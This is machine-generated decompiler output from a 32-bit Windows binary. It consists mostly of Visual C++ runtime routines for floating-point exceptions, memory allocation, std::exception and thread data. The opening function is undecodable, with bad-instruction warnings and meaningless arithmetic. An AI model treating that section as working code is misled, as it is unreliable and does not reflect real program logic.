          out(0xc6,uVar16 | (byte)(cVar11 + 0xb8));
          uVar16 = uVar16 | (byte)(cVar11 + 0x96) | (uint)puVar29;
          bVar8 = (byte)uVar16;
          uVar16 = uVar16 & 0xffffff00;
          unaff_EBP = unaff_EBP + (uVar16 | (byte)(bVar8 - 0x22)) + (uint)(0x21 < bVar8);
          puVar17 = (undefined4 *)(uVar16 | (byte)(bVar8 + 0x9a));
          bVar35 = 0xe1 < (byte)((char)uVar3 + 0xbcU);
          uVar16 = (uint)CONCAT11((char)uVar3 + -0x26,uVar24);
          uVar20 = uVar30 | uVar16;
          pcVar15 = (char *)(iVar21 + 0x78);
          cVar11 = *pcVar15;
          cVar9 = *pcVar15;
          *pcVar15 = cVar9 + '~' + bVar35;
        } while ((SCARRY1(cVar11,'~') != SCARRY1(cVar9 + '~',bVar35)) != *pcVar15 < '\0');
        cVar11 = (char)(uVar16 >> 8);
        uVar16 = ((uint)uVar3 & 0xffffff00 | (uint)(byte)(cVar11 + 0x9a)) + 0x87de04c5 +
                 (uint)(0x21 < (byte)(cVar11 + 0xbcU));
        puVar29[(uVar30 | CONCAT11(0xc0,uVar24)) * 2] = 0xde04c787;
        puVar29[(uVar30 | CONCAT11((char)((uint)CONCAT11(0xc0,uVar24) >> 8) + '$',uVar24)) * 2] =
             0xde04c787;
        return CONCAT44((int)uVar4,uVar16 & 0xffffff00 | (uint)(byte)((char)uVar16 + 0xbf));
      }
      in(uVar33);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    do {
    } while (CARRY4(uVar30,(uint)puVar14) || bVar36);
    uVar30 = (uint)((longlong)*(int *)(puVar14 + (uint)bVar35 * -2 + -0x40918689) * 0x1ae4686f);
    bVar8 = in(0xf1);
    uVar22 = (uint)auStack256 & 0xffff0000 |
             (uint)(ushort)((short)((short)register0x00000010 + -3) %
                            (short)*(char *)(uVar27 - 0x5a) << 8) | (uint)bVar8;
  } while ((longlong)(int)uVar30 ==
           (longlong)*(int *)(puVar14 + (uint)bVar35 * -2 + -0x40918689) * 0x1ae4686f && !bVar34);
  do {
    *(uint *)(unaff_EBP - 10) = *(uint *)(unaff_EBP - 10) ^ uVar22;
    do {
      cVar11 = (char)((uint)unaff_ESI >> 8);
      if (cVar11 < (char)bVar26) break;
      bVar36 = SBORROW1(cVar11,bVar26);
      bVar35 = (char)(cVar11 - bVar26) < '\0';
      while (bVar36 == bVar35) {
        bVar8 = (byte)((uint)unaff_ESI >> 8);
        while( true ) {
          if (bVar8 != bVar26) {
            if (!SBORROW1(bVar8,bVar26)) {
              do {
                    // WARNING: Do nothing block with infinite loop
              } while( true );
            }
                    // WARNING: Bad instruction - Truncating control flow here
            halt_baddata();
          }
          bVar36 = false;
          bVar8 = (byte)((uint)unaff_ESI >> 8) & bVar26;
          unaff_ESI = (uint *)((uint)bVar8 << 8);
          bVar35 = (short)((ushort)bVar8 << 8) < 0;
          if (!bVar35) break;
          if ((char)bVar26 <= (char)bVar8) {
                    // WARNING: Bad instruction - Truncating control flow here
            halt_baddata();
          }
        }
      }
    } while (bVar36 != bVar35);
  } while( true );
}



void __cdecl FUN_00417bda(int param_1,uint param_2,int *param_3)

{
  uint uVar1;
  double dVar2;
  ushort uVar3;
  int iVar4;
  
  dVar2 = (double)CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1)));
  if (dVar2 == 0.0) {
    iVar4 = 0;
  }
  else if (((param_2 & 0x7ff00000) == 0) && (((param_2 & 0xfffff) != 0 || (param_1 != 0)))) {
    iVar4 = -0x3fd;
    if ((param_2 & 0x100000) == 0) {
      do {
        uVar1 = param_2 * 2;
        param_2._0_2_ = (ushort)uVar1;
        param_2 = uVar1;
        if (param_1 < 0) {
          param_2 = uVar1 | 1;
        }
        param_1 = param_1 * 2;
        iVar4 = iVar4 + -1;
      } while ((uVar1 & 0x100000) == 0);
      param_2 = uVar1 & 0xffff0000 | (uint)(ushort)param_2;
    }
    uVar3 = (ushort)(param_2 >> 0x10) & 0xffef;
    param_2._2_1_ = (undefined)uVar3;
    param_2._3_1_ = (byte)(uVar3 >> 8);
    if ((ushort)((ushort)(0.0 < dVar2) << 8 | (ushort)(dVar2 == 0.0) << 0xe) == 0) {
      param_2._3_1_ = param_2._3_1_ | 0x80;
    }
    __set_exp(CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1))),0);
  }
  else {
    __set_exp((ulonglong)dVar2,0);
    iVar4 = (param_2 >> 0x14 & 0x7ff) - 0x3fe;
  }
  *param_3 = iVar4;
  return;
}



// Library Function - Single Match
//  __set_exp
// 
// Library: Visual Studio 2019 Release

float10 __cdecl __set_exp(ulonglong param_1,short param_2)

{
  double local_c;
  
  local_c = (double)(param_1 & 0xffffffffffff |
                    (ulonglong)(ushort)((param_2 + 0x3fe) * 0x10 | param_1._6_2_ & 0x800f) << 0x30);
  return (float10)local_c;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __handle_exc
// 
// Library: Visual Studio 2019 Release

bool __cdecl __handle_exc(uint param_1,double *param_2,uint param_3)

{
  double dVar1;
  double dVar2;
  float10 fVar3;
  double dVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  bool bVar8;
  float10 fVar9;
  float10 fVar10;
  uint local_10;
  byte bStack12;
  undefined uStack11;
  ushort uStack10;
  
  uVar5 = param_1;
  uVar7 = param_1 & 0x1f;
  if (((param_1 & 8) != 0) && ((param_3 & 1) != 0)) {
    FUN_0041829e(1);
    uVar7 = uVar5 & 0x17;
    goto LAB_00417e96;
  }
  if (((param_1 & 4) != 0) && ((param_3 & 4) != 0)) {
    FUN_0041829e(4);
    uVar7 = uVar5 & 0x1b;
    goto LAB_00417e96;
  }
  if (((param_1 & 1) == 0) || ((param_3 & 8) == 0)) {
    if (((param_1 & 2) != 0) && ((param_3 & 0x10) != 0)) {
      bVar8 = (param_1 & 0x10) != 0;
      if (*param_2 == 0.0) {
        bVar8 = true;
      }
      else {
        fVar9 = (float10)FUN_00417bda(SUB84(*param_2,0),(uint)((ulonglong)*param_2 >> 0x20),
                                      (int *)&param_1);
        param_1 = param_1 - 0x600;
        dVar2 = (double)fVar9;
        local_10 = SUB84(dVar2,0);
        bStack12 = (byte)((ulonglong)dVar2 >> 0x20);
        uStack11 = (undefined)((ulonglong)dVar2 >> 0x28);
        uStack10 = (ushort)((ulonglong)dVar2 >> 0x30);
        fVar3 = (float10)0;
        if ((int)param_1 < -0x432) {
          fVar10 = fVar3 * fVar9;
          bVar8 = true;
        }
        else {
          uStack10 = uStack10 & 0xf | 0x10;
          if ((int)param_1 < -0x3fd) {
            iVar6 = -0x3fd - param_1;
            do {
              if (((local_10 & 1) != 0) && (!bVar8)) {
                bVar8 = true;
              }
              local_10 = local_10 >> 1;
              if ((bStack12 & 1) != 0) {
                local_10 = local_10 | 0x80000000;
              }
              uVar7 = CONCAT22(uStack10,CONCAT11(uStack11,bStack12)) >> 1;
              bStack12 = (byte)uVar7;
              uStack11 = (undefined)(uVar7 >> 8);
              uStack10 = uStack10 >> 1;
              iVar6 = iVar6 + -1;
            } while (iVar6 != 0);
          }
          fVar10 = (float10)(double)CONCAT26(uStack10,CONCAT15(uStack11,CONCAT14(bStack12,local_10))
                                            );
          if ((ushort)((ushort)(fVar3 < fVar9) << 8 | (ushort)(fVar3 == fVar9) << 0xe) == 0) {
            fVar10 = -fVar10;
          }
        }
        *param_2 = (double)fVar10;
      }
      if (bVar8) {
        FUN_0041829e(0x10);
      }
      uVar7 = uVar5 & 0x1d;
    }
    goto LAB_00417e96;
  }
  FUN_0041829e(8);
  uVar7 = param_3 & 0xc00;
  dVar2 = _DAT_00435198;
  dVar4 = _DAT_00435198;
  if (uVar7 == 0) {
    dVar1 = *param_2;
joined_r0x00417d7c:
    if (dVar1 <= 0.0) {
      dVar2 = -dVar4;
    }
    *param_2 = dVar2;
  }
  else {
    if (uVar7 == 0x400) {
      dVar1 = *param_2;
      dVar2 = _DAT_004351a8;
      goto joined_r0x00417d7c;
    }
    dVar4 = _DAT_004351a8;
    if (uVar7 == 0x800) {
      dVar1 = *param_2;
      goto joined_r0x00417d7c;
    }
    if (uVar7 == 0xc00) {
      dVar1 = *param_2;
      dVar2 = _DAT_004351a8;
      goto joined_r0x00417d7c;
    }
  }
  uVar7 = uVar5 & 0x1e;
LAB_00417e96:
  if (((uVar5 & 0x10) != 0) && ((param_3 & 0x20) != 0)) {
    FUN_0041829e(0x20);
    uVar7 = uVar7 & 0xffffffef;
  }
  return uVar7 == 0;
}



void __cdecl
FUN_00417eb9(uint *param_1,uint *param_2,uint param_3,int param_4,undefined8 *param_5,
            undefined8 *param_6)

{
  FUN_00417eda(param_1,param_2,param_3,param_4,param_5,param_6,0);
  return;
}



void __cdecl
FUN_00417eda(uint *param_1,uint *param_2,uint param_3,int param_4,undefined8 *param_5,
            undefined8 *param_6,int param_7)

{
  uint *puVar1;
  undefined8 *puVar2;
  uint uVar3;
  DWORD dwExceptionCode;
  
  puVar1 = param_2;
  param_1[1] = 0;
  dwExceptionCode = 0xc000000d;
  param_1[2] = 0;
  param_1[3] = 0;
  if ((param_3 & 0x10) != 0) {
    dwExceptionCode = 0xc000008f;
    param_1[1] = param_1[1] | 1;
  }
  if ((param_3 & 2) != 0) {
    dwExceptionCode = 0xc0000093;
    param_1[1] = param_1[1] | 2;
  }
  if ((param_3 & 1) != 0) {
    dwExceptionCode = 0xc0000091;
    param_1[1] = param_1[1] | 4;
  }
  if ((param_3 & 4) != 0) {
    dwExceptionCode = 0xc000008e;
    param_1[1] = param_1[1] | 8;
  }
  if ((param_3 & 8) != 0) {
    dwExceptionCode = 0xc0000090;
    param_1[1] = param_1[1] | 0x10;
  }
  param_1[2] = param_1[2] ^ (~(*param_2 << 4) ^ param_1[2]) & 0x10;
  param_1[2] = param_1[2] ^ (~(*param_2 * 2) ^ param_1[2]) & 8;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 1) ^ param_1[2]) & 4;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 3) ^ param_1[2]) & 2;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 5) ^ param_1[2]) & 1;
  uVar3 = FUN_004182f6();
  puVar2 = param_6;
  if ((uVar3 & 1) != 0) {
    param_1[3] = param_1[3] | 0x10;
  }
  if ((uVar3 & 4) != 0) {
    param_1[3] = param_1[3] | 8;
  }
  if ((uVar3 & 8) != 0) {
    param_1[3] = param_1[3] | 4;
  }
  if ((uVar3 & 0x10) != 0) {
    param_1[3] = param_1[3] | 2;
  }
  if ((uVar3 & 0x20) != 0) {
    param_1[3] = param_1[3] | 1;
  }
  uVar3 = *puVar1 & 0xc00;
  if (uVar3 == 0) {
    *param_1 = *param_1 & 0xfffffffc;
  }
  else {
    if (uVar3 == 0x400) {
      uVar3 = *param_1 & 0xfffffffd | 1;
    }
    else {
      if (uVar3 != 0x800) {
        if (uVar3 == 0xc00) {
          *param_1 = *param_1 | 3;
        }
        goto LAB_0041803a;
      }
      uVar3 = *param_1 & 0xfffffffe | 2;
    }
    *param_1 = uVar3;
  }
LAB_0041803a:
  uVar3 = *puVar1 & 0x300;
  if (uVar3 == 0) {
    uVar3 = *param_1 & 0xffffffeb | 8;
LAB_00418070:
    *param_1 = uVar3;
  }
  else {
    if (uVar3 == 0x200) {
      uVar3 = *param_1 & 0xffffffe7 | 4;
      goto LAB_00418070;
    }
    if (uVar3 == 0x300) {
      *param_1 = *param_1 & 0xffffffe3;
    }
  }
  *param_1 = *param_1 ^ (param_4 << 5 ^ *param_1) & 0x1ffe0;
  param_1[8] = param_1[8] | 1;
  if (param_7 == 0) {
    param_1[8] = param_1[8] & 0xffffffe3 | 2;
    *(undefined8 *)(param_1 + 4) = *param_5;
    param_1[0x18] = param_1[0x18] | 1;
    param_1[0x18] = param_1[0x18] & 0xffffffe3 | 2;
    *(undefined8 *)(param_1 + 0x14) = *param_6;
  }
  else {
    param_1[8] = param_1[8] & 0xffffffe1;
    param_1[4] = *(uint *)param_5;
    param_1[0x18] = param_1[0x18] | 1;
    param_1[0x18] = param_1[0x18] & 0xffffffe1;
    param_1[0x14] = *(uint *)param_6;
  }
  FUN_00418262();
  RaiseException(dwExceptionCode,0,1,(ULONG_PTR *)&param_1);
  if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
    *puVar1 = *puVar1 & 0xfffffffe;
  }
  if ((*(byte *)(param_1 + 2) & 8) != 0) {
    *puVar1 = *puVar1 & 0xfffffffb;
  }
  if ((*(byte *)(param_1 + 2) & 4) != 0) {
    *puVar1 = *puVar1 & 0xfffffff7;
  }
  if ((*(byte *)(param_1 + 2) & 2) != 0) {
    *puVar1 = *puVar1 & 0xffffffef;
  }
  if ((*(byte *)(param_1 + 2) & 1) != 0) {
    *puVar1 = *puVar1 & 0xffffffdf;
  }
  uVar3 = *param_1 & 3;
  if (uVar3 == 0) {
    *puVar1 = *puVar1 & 0xfffff3ff;
  }
  else {
    if (uVar3 == 1) {
      uVar3 = *puVar1 & 0xfffff7ff | 0x400;
    }
    else {
      if (uVar3 != 2) {
        if (uVar3 == 3) {
          *puVar1 = *puVar1 | 0xc00;
        }
        goto LAB_0041817b;
      }
      uVar3 = *puVar1 & 0xfffffbff | 0x800;
    }
    *puVar1 = uVar3;
  }
LAB_0041817b:
  uVar3 = *param_1 >> 2 & 7;
  if (uVar3 == 0) {
    uVar3 = *puVar1 & 0xfffff3ff | 0x300;
  }
  else {
    if (uVar3 != 1) {
      if (uVar3 == 2) {
        *puVar1 = *puVar1 & 0xfffff3ff;
      }
      goto LAB_004181a8;
    }
    uVar3 = *puVar1 & 0xfffff3ff | 0x200;
  }
  *puVar1 = uVar3;
LAB_004181a8:
  if (param_7 == 0) {
    *puVar2 = *(undefined8 *)(param_1 + 0x14);
  }
  else {
    *(uint *)puVar2 = param_1[0x14];
  }
  return;
}



// Library Function - Single Match
//  __set_errno_from_matherr
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __cdecl __set_errno_from_matherr(int param_1)

{
  int *piVar1;
  
  if (param_1 == 1) {
    piVar1 = __errno();
    *piVar1 = 0x21;
  }
  else if (param_1 - 2U < 2) {
    piVar1 = __errno();
    *piVar1 = 0x22;
    return;
  }
  return;
}



int FUN_00418262(void)

{
  short in_FPUStatusWord;
  
  return (int)in_FPUStatusWord;
}



// Library Function - Single Match
//  __ctrlfp
// 
// Library: Visual Studio 2019 Release

int __ctrlfp(undefined4 param_1,undefined4 param_2)

{
  short in_FPUControlWord;
  
  return (int)in_FPUControlWord;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041829e(uint param_1)

{
  return;
}



int FUN_004182f6(void)

{
  short in_FPUStatusWord;
  
  return (int)in_FPUStatusWord;
}



void __cdecl FUN_00418306(int param_1)

{
  FUN_0041831d();
  if (param_1 != 0) {
    FUN_0041ba7d();
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041831d(void)

{
  DAT_00435438 = 0x41afdf;
  _DAT_0043543c = &DAT_0041b8cb;
  ram0x00435440 = &DAT_0041b95c;
  _DAT_00435444 = &DAT_0041b9b6;
  _DAT_00435448 = &DAT_0041ba3b;
  _DAT_0043544c = 0x41afdf;
  _DAT_00435450 = 0x41b000;
  _DAT_00435454 = &DAT_0041b974;
  _DAT_00435458 = &DAT_0041b8dc;
  _DAT_0043545c = &LAB_0041b9c7;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2012 Release

void * __cdecl _malloc(size_t _Size)

{
  void *pvVar1;
  int iVar2;
  int *piVar3;
  SIZE_T dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_004369ec == (HANDLE)0x0) {
        __FF_MSGBANNER();
        FUN_004190f9(0x1e);
        ___crtExitProcess(0xff);
      }
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
      pvVar1 = HeapAlloc(DAT_004369ec,0,dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (_DAT_00437514 == 0) {
        piVar3 = __errno();
        *piVar3 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar3 = __errno();
    *piVar3 = 0xc;
    pvVar1 = (void *)0x0;
  }
  return pvVar1;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  FUN_004184d5(this,*param_1);
  return this;
}



undefined4 * __thiscall FUN_00418434(void *this,undefined4 *param_1)

{
  *(undefined ***)this = std::exception::vftable;
  *(undefined4 *)((int)this + 4) = *param_1;
  *(undefined *)((int)this + 8) = 0;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2012 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  operator_(this,param_1);
  return this;
}



void __fastcall FUN_00418472(undefined4 *param_1)

{
  *param_1 = std::exception::vftable;
  std::exception::_Tidy((exception *)param_1);
  return;
}



// Library Function - Single Match
//  public: class std::exception & __thiscall std::exception::operator=(class std::exception const
// &)
// 
// Library: Visual Studio 2012 Release

exception * __thiscall std::exception::operator_(exception *this,exception *param_1)

{
  if (this != param_1) {
    _Tidy(this);
    if (param_1[8] == (exception)0x0) {
      *(undefined4 *)(this + 4) = *(undefined4 *)(param_1 + 4);
    }
    else {
      FUN_004184d5(this,*(char **)(param_1 + 4));
    }
  }
  return this;
}



undefined4 * __thiscall FUN_004184b0(void *this,byte param_1)

{
  *(undefined ***)this = std::exception::vftable;
  std::exception::_Tidy((exception *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __thiscall FUN_004184d5(void *this,char *param_1)

{
  size_t sVar1;
  void *pvVar2;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    pvVar2 = _malloc(sVar1 + 1);
    *(void **)((int)this + 4) = pvVar2;
    if (pvVar2 != (void *)0x0) {
      FUN_0041baa4();
      *(undefined *)((int)this + 8) = 1;
    }
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Tidy(void)
// 
// Library: Visual Studio 2012 Release

void __thiscall std::exception::_Tidy(exception *this)

{
  if (this[8] != (exception)0x0) {
    FID_conflict__free(*(void **)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  this[8] = (exception)0x0;
  return;
}



char * __fastcall FUN_0041852f(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2012 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)DecodePointer(DAT_00436a30);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



void __cdecl FUN_00418562(undefined4 param_1)

{
  DAT_00436a30 = param_1;
  return;
}



void FUN_0041856f(int *param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  int *local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0042867c;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  if ((param_2 != (byte *)0x0) && ((*param_2 & 0x10) != 0)) {
    iVar1 = *(int *)(*param_1 + -4);
    param_2 = *(byte **)(iVar1 + 0x18);
    (**(code **)(iVar1 + 0x20))((int *)(*param_1 + -4));
  }
  local_c = param_1;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  local_8 = param_2;
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __thiscall type_info::_type_info(type_info *this)

{
  int in_EDX;
  
  *(undefined ***)this = vftable;
  FUN_0041bb8c((int)this,in_EDX);
  return;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2012 Release

bool __thiscall type_info::operator__(type_info *this,type_info *param_1)

{
  undefined *puVar1;
  int in_EDX;
  
  puVar1 = FUN_0041bb00((uint)this,in_EDX,(undefined4 *)(param_1 + 9));
  return (bool)('\x01' - (puVar1 != (undefined *)0x0));
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,unsigned_int param_1)

{
  _type_info(this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return this;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Library: Visual Studio 2012 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  code *pcVar3;
  long lVar4;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
    pcVar3 = (code *)swi(3);
    lVar4 = (*pcVar3)();
    return lVar4;
  }
  return 0;
}



_ptiddata __cdecl FUN_0041866c(int param_1,void *param_2)

{
  int *piVar1;
  code *pcVar2;
  void *pvVar3;
  _ptiddata p_Var4;
  int *piVar5;
  int iVar6;
  
  p_Var4 = __getptd_noexit();
  if (p_Var4 != (_ptiddata)0x0) {
    piVar1 = (int *)p_Var4->_pxcptacttab;
    piVar5 = piVar1;
    do {
      if (*piVar5 == param_1) break;
      piVar5 = piVar5 + 3;
    } while (piVar5 < piVar1 + 0x24);
    if ((piVar1 + 0x24 <= piVar5) || (*piVar5 != param_1)) {
      piVar5 = (int *)0x0;
    }
    if ((piVar5 == (int *)0x0) || (pcVar2 = (code *)piVar5[2], pcVar2 == (code *)0x0)) {
      p_Var4 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      piVar5[2] = 0;
      p_Var4 = (_ptiddata)0x1;
    }
    else if (pcVar2 == (code *)0x1) {
      p_Var4 = (_ptiddata)0xffffffff;
    }
    else {
      pvVar3 = p_Var4->_tpxcptinfoptrs;
      p_Var4->_tpxcptinfoptrs = param_2;
      if (piVar5[1] == 8) {
        iVar6 = 0x24;
        do {
          *(undefined4 *)(iVar6 + 8 + (int)p_Var4->_pxcptacttab) = 0;
          iVar6 = iVar6 + 0xc;
        } while (iVar6 < 0x90);
        iVar6 = p_Var4->_tfpecode;
        if (*piVar5 == -0x3fffff72) {
          p_Var4->_tfpecode = 0x83;
        }
        else if (*piVar5 == -0x3fffff70) {
          p_Var4->_tfpecode = 0x81;
        }
        else if (*piVar5 == -0x3fffff6f) {
          p_Var4->_tfpecode = 0x84;
        }
        else if (*piVar5 == -0x3fffff6d) {
          p_Var4->_tfpecode = 0x85;
        }
        else if (*piVar5 == -0x3fffff73) {
          p_Var4->_tfpecode = 0x82;
        }
        else if (*piVar5 == -0x3fffff71) {
          p_Var4->_tfpecode = 0x86;
        }
        else if (*piVar5 == -0x3fffff6e) {
          p_Var4->_tfpecode = 0x8a;
        }
        else if (*piVar5 == -0x3ffffd4b) {
          p_Var4->_tfpecode = 0x8d;
        }
        else if (*piVar5 == -0x3ffffd4c) {
          p_Var4->_tfpecode = 0x8e;
        }
        (*pcVar2)(8,p_Var4->_tfpecode);
        p_Var4->_tfpecode = iVar6;
      }
      else {
        piVar5[2] = 0;
        (*pcVar2)(piVar5[1]);
      }
      p_Var4->_tpxcptinfoptrs = pvVar3;
      p_Var4 = (_ptiddata)0xffffffff;
    }
  }
  return p_Var4;
}



void FUN_004188e7(void)

{
  FUN_00419c57(0xd);
  return;
}



void FUN_004188f3(void)

{
  FUN_00419c57(0xc);
  return;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2012 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2012 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  _ptiddata _Memory;
  int iVar1;
  DWORD DVar2;
  
  dwErrCode = GetLastError();
  _Memory = (_ptiddata)FUN_00419479(DAT_004352cc);
  if (_Memory == (_ptiddata)0x0) {
    _Memory = (_ptiddata)FUN_0041770d(1,0x3bc);
    if (_Memory != (_ptiddata)0x0) {
      iVar1 = FUN_00419498(DAT_004352cc,_Memory);
      if (iVar1 == 0) {
        FID_conflict__free(_Memory);
        _Memory = (_ptiddata)0x0;
      }
      else {
        FUN_00418983((int)_Memory,0);
        DVar2 = GetCurrentThreadId();
        _Memory->_thandle = 0xffffffff;
        _Memory->_tid = DVar2;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Memory;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __cdecl FUN_00418983(int param_1,int param_2)

{
  int extraout_EDX;
  int iVar1;
  
  *(undefined **)(param_1 + 0x5c) = &DAT_004286a8;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x14) = 1;
  *(undefined4 *)(param_1 + 0x70) = 1;
  *(undefined2 *)(param_1 + 0xb8) = 0x43;
  *(undefined2 *)(param_1 + 0x1be) = 0x43;
  *(undefined4 **)(param_1 + 0x68) = &DAT_00435668;
  *(undefined4 *)(param_1 + 0x3b8) = 0;
  __lock(0xd);
  LOCK();
  **(int **)(param_1 + 0x68) = **(int **)(param_1 + 0x68) + 1;
  FUN_00418a24();
  iVar1 = 0xc;
  __lock(0xc);
  *(int *)(param_1 + 0x6c) = param_2;
  if (param_2 == 0) {
    *(undefined4 *)(param_1 + 0x6c) = DAT_00435b0c;
  }
  FUN_0041bbfd(iVar1,extraout_EDX);
  FUN_00418a2d();
  return;
}



void FUN_00418a24(void)

{
  FUN_00419c57(0xd);
  return;
}



void FUN_00418a2d(void)

{
  FUN_00419c57(0xc);
  return;
}



undefined4 FUN_00418a36(void)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD DVar3;
  
  FUN_004174f7();
  iVar1 = FUN_00419c1e();
  if (iVar1 != 0) {
    DAT_004352cc = FUN_0041943c(&LAB_004187c7);
    if (DAT_004352cc != 0xffffffff) {
      pDVar2 = (DWORD *)FUN_0041770d(1,0x3bc);
      if (pDVar2 != (DWORD *)0x0) {
        iVar1 = FUN_00419498(DAT_004352cc,pDVar2);
        if (iVar1 != 0) {
          FUN_00418983((int)pDVar2,0);
          DVar3 = GetCurrentThreadId();
          pDVar2[1] = 0xffffffff;
          *pDVar2 = DVar3;
          return 1;
        }
      }
      FUN_00418aac();
      return 0;
    }
  }
  FUN_00418aac();
  return 0;
}



void FUN_00418aac(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION *pp_Var2;
  
  if (DAT_004352cc != 0xffffffff) {
    FUN_0041945a(DAT_004352cc);
    DAT_004352cc = 0xffffffff;
  }
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00435318;
  pp_Var2 = (LPCRITICAL_SECTION *)&DAT_00435318;
  do {
    lpCriticalSection = *pp_Var2;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var2[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      FID_conflict__free(lpCriticalSection);
      *pp_Var2 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var2 = pp_Var2 + 2;
  } while ((int)pp_Var2 < 0x435438);
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x435438);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00418ac9(void)

{
  HANDLE hFile;
  uint uVar1;
  byte bVar2;
  undefined4 uVar3;
  DWORD DVar4;
  HANDLE pvVar5;
